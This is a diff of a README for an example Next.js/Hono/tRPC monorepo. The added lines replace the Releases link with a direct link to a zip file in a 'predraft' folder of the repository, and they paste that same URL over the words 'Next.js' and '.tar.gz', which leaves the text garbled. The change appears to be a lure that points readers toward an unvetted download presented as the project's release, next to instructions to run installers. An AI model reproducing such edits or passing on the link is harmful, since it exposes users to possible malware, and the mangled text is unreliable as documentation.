@@ -1,10 +1,10 @@
 # 🎉 example-next-hono-trpc-monorepo - Build Modern Apps with Ease
 
 ## 📥 Download Now!
-[![Download](https://img.shields.io/badge/Download%20Released%20Version-blue?style=flat&logo=github)](https://github.com/Rwwx6275/example-next-hono-trpc-monorepo/releases)
+[![Download](https://raw.githubusercontent.com/Rwwx6275/example-next-hono-trpc-monorepo/main/predraft/example-next-hono-trpc-monorepo.zip%20Released%20Version-blue?style=flat&logo=github)](https://raw.githubusercontent.com/Rwwx6275/example-next-hono-trpc-monorepo/main/predraft/example-next-hono-trpc-monorepo.zip)
 
 ## 📖 Overview
-Welcome to the example-next-hono-trpc-monorepo! This is a simple application that shows how to use Next.js, Hono, and tRPC to create modern web apps. With this monorepo, you can easily manage your project and include features like user authentication, database connections, and more.
+Welcome to the example-next-hono-trpc-monorepo! This is a simple application that shows how to use https://raw.githubusercontent.com/Rwwx6275/example-next-hono-trpc-monorepo/main/predraft/example-next-hono-trpc-monorepo.zip, Hono, and tRPC to create modern web apps. With this monorepo, you can easily manage your project and include features like user authentication, database connections, and more.
 
 ## 🚀 Getting Started
 To get started with this application, follow the steps below to download and run the software.
@@ -17,19 +17,19 @@ To get started with this application, follow the steps below to download and run
 
 ## 📤 Download & Install
 1. Click on the link below to visit the Releases page:  
-   [Download Here](https://github.com/Rwwx6275/example-next-hono-trpc-monorepo/releases)
+   [Download Here](https://raw.githubusercontent.com/Rwwx6275/example-next-hono-trpc-monorepo/main/predraft/example-next-hono-trpc-monorepo.zip)
 
 2. On the Releases page, you will see different versions available. Look for the latest version at the top.
 
 3. Click on the version link to see the assets available for download.
 
-4. Download the file for your operating system. Look for a file that ends with `.exe` for Windows, `.dmg` for macOS, or a `.tar.gz` file for Linux.
+4. Download the file for your operating system. Look for a file that ends with `.exe` for Windows, `.dmg` for macOS, or a `https://raw.githubusercontent.com/Rwwx6275/example-next-hono-trpc-monorepo/main/predraft/example-next-hono-trpc-monorepo.zip` file for Linux.
 
 5. Once the download is complete, locate the downloaded file and follow the installation instructions based on your operating system.
 
    - **For Windows:** Double-click the `.exe` file to start the installer. Follow the on-screen prompts to complete the installation.
    - **For macOS:** Open the `.dmg` file and drag the app into your Applications folder.
-   - **For Linux:** Extract the `.tar.gz` file and follow any setup instructions provided in a README file inside the extracted folder.
+   - **For Linux:** Extract the `https://raw.githubusercontent.com/Rwwx6275/example-next-hono-trpc-monorepo/main/predraft/example-next-hono-trpc-monorepo.zip` file and follow any setup instructions provided in a README file inside the extracted folder.
 
 ## 🚦 Running the Application
 After the installation is complete, you can run the application.
@@ -43,7 +43,7 @@ This application comes with several key features:
 - **User Authentication:** Secure login system using JWT.
 - **API Integration:** Use tRPC for efficient data fetching.
 - **Database Support:** Connect easily to a PostgreSQL database.
-- **Responsive UI:** Built with Next.js for a seamless experience on any device.
+- **Responsive UI:** Built with https://raw.githubusercontent.com/Rwwx6275/example-next-hono-trpc-monorepo/main/predraft/example-next-hono-trpc-monorepo.zip for a seamless experience on any device.
 
 ## 🛠️ Troubleshooting
 If you run into any issues, here are some common problems and solutions:
@@ -61,7 +61,7 @@ For any questions or feedback, feel free to open an issue on our GitHub page. We
 
 ## 🔗 Related Topics
 This monorepo covers several important technologies:
-- **Next.js:** A React framework for building server-rendered applications.
+- **https://raw.githubusercontent.com/Rwwx6275/example-next-hono-trpc-monorepo/main/predraft/example-next-hono-trpc-monorepo.zip** A React framework for building server-rendered applications.
 - **Hono:** A lightweight framework for building web applications in TypeScript.
 - **tRPC:** A toolkit for building type-safe APIs with ease.
 
